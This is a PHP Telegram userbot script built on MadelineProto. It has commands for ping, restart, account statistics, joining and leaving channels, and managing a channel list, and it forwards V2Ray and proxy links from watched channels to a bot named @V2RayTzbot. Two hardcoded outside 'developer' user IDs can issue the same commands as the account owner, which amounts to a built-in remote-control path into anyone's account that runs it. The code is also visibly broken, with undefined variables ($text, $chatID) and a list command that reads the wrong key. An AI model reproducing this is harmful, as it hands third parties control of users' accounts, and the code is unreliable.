<?php

error_reporting(0);  
ini_set("log_errors","off");
ini_set('display_errors','1');
ini_set('memory_limit' , '-1');
ini_set('max_execution_time','0');
ini_set('display_startup_errors','1');


if (!file_exists('madeline.php')) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}
include 'madeline.php';
use \danog\MadelineProto\API;
use \danog\Loop\Generic\GenericLoop;
use \danog\MadelineProto\EventHandler;
use function Amp\File\{get, put, exists, unlink};

if(!file_exists('data.json')){
file_put_contents('data.json','{"channel":{}}');
}

class XHandler extends EventHandler
{
    const Report = '@PHPReport'; 
    
    public function getReportPeers()
    {
        return [self::Report];
    }
    
    public function genLoop()
    {

        date_default_timezone_set('Asia/Tehran');
        

return 60000;
    }
    public function onStart()
    {
        $this->timen = time();
        $genLoop = new GenericLoop([$this, 'genLoop'], 'update Status');
        $genLoop->start();
        $this->start_time = time();
    }
    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }
    
    public function onUpdateNewMessage($update)
    {
        if (time() - $update['message']['date'] > 2) {
return;
        }
        try {
$msgOrig   = $update['message']['message']?? null;
$message_id = $update['message']['id']?? 0;
$fromId    = $update['message']['from_id']['user_id']?? 0;
$user_id   = isset($update['message']['from_id']['user_id']) ? $update['message']['from_id']['user_id'] : null;
$info      = yield $this->getInfo($update);
$type      = $info['type'];
$replyToId = $update['message']['reply_to']['reply_to_msg_id']?? 0;
$peer = yield $this->getID($update);  
$me = yield $this->getSelf();
$chat_id      = yield $this->getID($update);
$me_id = $me['id'];
$action  = isset($update['message']['action']) ? $update['message']['action'] : null;
@$data = json_decode(file_get_contents("data/data.json") , true);
$com = isset($update['message']['fwd_from']['saved_from_peer']) ? true : false;
$verself = "v1";
$Library = "MadelineProto";
$date = date('Y/m/d');
$time = date('H:i');
$admin = ""; //$me_id
$data = json_decode(file_get_contents("data.json"), true);

$DeveloperTz = array("1680026056","5338490508");
if((in_array($fromId, $DeveloperTz)) or $fromId == $me_id) {
// @MrDevTz - @SiNo_Tz

if(preg_match('/^[\/\#\!\.]?(bot|ربات|بات)$/si', $msgOrig)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => '<b>What ‽</b>',
    'parse_mode'      => "HTML"]);
}
if(preg_match('/^[\/\#\!\.]?(ping|پینگ)$/si', $msgOrig)) {
$domain = 'tcp://149.154.167.51';
$port = 443;
$starttime = microtime(true);
$file = fsockopen($domain, $port, $s, $s, 1);
$stoptime = microtime(true);
fclose($file);
$ping = floor(($stoptime - $starttime) * 1000);
$load         = sys_getloadavg()[0];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "
<b>Load Host : $load Ms
Telegram Ping : $ping Ms</b>",
    'parse_mode'      => "HTML"]);
}

if(preg_match('/^[\/\#\!\.]?(restart|ریست|ریستارت)$/si', $msgOrig)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => '<b>Restart.</b>',
    'parse_mode'      => "HTML"]);
file_put_contents('data/lastupdate.txt', time());
yield $this->restart();
}

if(preg_match('/^[\#\!\.\/]?(acc status)$/i', $msgOrig)){
$chats = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
foreach (yield $this->getDialogs() as $dialog) {
$chats[yield $this->getInfo($dialog)['type']]++;}
$dialogs = count(yield $this->getDialogs());
$user = $chats['user'];
$chat = $chats['chat'];
$Supergroup = $chats['supergroup'];
$channel = $chats['channel'];
$bot = $chats['bot'];
$contacts = count(yield $this->contacts->getContacts()['contacts']);
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "• **Account Statistics** •\n\n**├ • All :** ( `$dialogs` )\n**├ • Privete :** ( `$user` )\n**├ • Group :** ( `$chat` )\n**├ • SuperGroup :** ( `$Supergroup` )\n**├ • Channel :** ( `$channel` )\n**├ • Bot :** ( `$bot` )\n**├ • Contact :** ( `$contacts` )", 'parse_mode' => 'MarkDown']);}

if(preg_match("/^[#\!\/](add channel) (.*)$/", $msgOrig, $m)){
$id = $m[2];
if (!isset($data['channel'][$id])) {
$data['channel'][$id] = $id;
file_put_contents("data.json", json_encode($data));
yield $this->messages->sendMessage([
'peer' => $chat_id,
'message' => "❕Channel: $id was added to the database ✅.",
]);
}else{
yield $this->messages->sendMessage([
'peer' => $chat_id,
 'message' => "❗️it exists in the database.",
 ]);
}
}
if(preg_match("/^[#\!\/](delete channel) (.*)$/", $msgOrig, $m)){
$id = $m[2];
if (isset($data['channel'][$id])) {
unset($data['channel'][$id]);
file_put_contents("data.json", json_encode($data));
yield $this->messages->sendMessage([
'peer' => $chat_id,
'message' => "❕Channel: $id was removed from the database ✅.",
]);
}else{
yield $this->messages->sendMessage([
'peer' => $chat_id,
'message' => "❗️Not in the database.",
]);
}
}
if(preg_match("/^[\/\#\!]?(clean channel list|clear channel list)$/i", $msgOrig)){
$data['channel'] = [];
file_put_contents("data.json", json_encode($data));
yield $this->messages->sendMessage([
'peer' => $chat_id,
'message' => "❕The list of channels is empty ☑️."
]);
}
if(preg_match("/^[\/\#\!]?(channel list)$/i", $msgOrig)){
if(count($data['channel']) > 0){
$txxxt = "🌐 List of channels :
";
$counter = 1;
foreach($data['admins'] as $k){
$txxxt .= "❕$counter : $k\n";
$counter++;
}
yield $this->messages->sendMessage(['peer' => $chat_id,
'message' => $txxxt, 
]);
}else{
yield $this->messages->sendMessage(['peer' => $chat_id,
'message' => "⚠️ The list of channels is empty!"]);
}
}

if(preg_match("/^[\/\#\!]?(join) (.*)$/i", $msgOrig)){
    preg_match("/^[\/\#\!]?(join) (.*)$/i", $msgOrig, $text);
    $id = $text[2];
    try {
    yield $this->channels->joinChannel(['channel' => "$id"]);
    yield $this->messages->sendMessage(['peer' => $chatID, 
    'message' => '✅ 𝗷𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹.',]);
    } catch(Exception $e){
    yield $this->messages->sendMessage(['peer' => $chatID, 
    'message' => '❗️<code>'.$e->getMessage().'</code>',
    'parse_mode'=>'html',]);
}}
if(preg_match("/^[\/\#\!]?(left) (.*)$/i", $msgOrig)){
    preg_match("/^[\/\#\!]?(left) (.*)$/i", $msgOrig, $text);
    $id = $text[2];
    try {
    yield $this->channels->leaveChannel(['channel' => "$id"]);
    yield $this->messages->sendMessage(['peer' => $chatID, 
    'message' => '🚫 𝗘𝘅𝗶𝘁 𝗖𝗵𝗮𝗻𝗻𝗲𝗹.',]);
    } catch(Exception $e){
    yield $this->messages->sendMessage(['peer' => $chatID, 
    'message' => '❗️<code>'.$e->getMessage().'</code>',
    'parse_mode'=>'html',]);
}}
}

if (isset($data['channel'][$msgOrig])){
if(strstr($text,'vmess:')){
yield $this->messages->forwardMessages([
'from_peer' => 
"$peer", 
'to_peer' => "@V2RayTzbot",
'id' => [$message_id],
 ]);
}
if(strstr($text,'vless:')){
yield $this->messages->forwardMessages([
'from_peer' => 
"$peer", 
'to_peer' => "@V2RayTzbot",
'id' => [$message_id],
 ]);
}
if(strstr($text,'trojan:')){
yield $this->messages->forwardMessages([
'from_peer' => 
"$peer", 
'to_peer' => "@V2RayTzbot",
'id' => [$message_id],
 ]);
}
if(strstr($text,'ss:')){
yield $this->messages->forwardMessages([
'from_peer' => 
"$peer", 
'to_peer' => "@V2RayTzbot",
'id' => [$message_id],
 ]);
}
if(strstr($text,'proxy?')){
yield $this->messages->forwardMessages([
'from_peer' => 
"$peer", 
'to_peer' => "@V2RayTzbot",
'id' => [$message_id],
 ]);
}
}
// end Looks

}catch (\Throwable $e){
$this->report("ERROR - Tz : $e");
}
}
}
$settings = [
'serialization' => [
'cleanup_before_serialization' => true,
],
'logger' => [
'max_size' => 1*1024*1024,
],
'peer' => [
'full_fetch' => false,
'cache_all_peers_on_startup' => false,
],
];
$bot = new \danog\MadelineProto\API('SiNoTz.session', $settings);
$bot->startAndLoop(XHandler::class);
?>
